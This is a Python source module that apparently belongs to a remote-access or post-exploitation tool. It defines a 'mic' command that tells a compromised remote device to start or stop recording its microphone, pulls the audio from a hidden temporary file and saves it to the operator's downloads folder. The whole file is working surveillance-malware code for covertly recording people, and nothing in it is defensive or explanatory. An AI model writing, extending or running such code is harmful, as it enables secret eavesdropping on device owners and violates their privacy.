import modules.helper as h
import json
import time
import os

class command:
    def __init__(self):
        self.name = "mic"
        self.description = "Record Ongoing Mic Activity On The Remote Device!"
        
    def run(self,session,cmd_data):
              
        if cmd_data["args"] == "stop":
            
            result = json.loads(session.send_command(cmd_data))
            if 'error' in result:
                h.info_error("Error: " + result['error'])
            elif 'status' in result and result['status'] == 1:
                
                data = session.download_file("/tmp/.avatmp")
                
                file_name = "mic{0}.caf".format(str(int(time.time())))
                h.info_general("Saving {0}".format(file_name))
                f = open(os.path.join('downloads',file_name),'w')
                f.write(data)
                f.close()
                h.info_general("Saved to ./downloads/{0}".format(file_name))
            
        elif cmd_data["args"] == "record":
            h.info_general(session.send_command(cmd_data))
        else:
            print "Usage: mic record/stop"
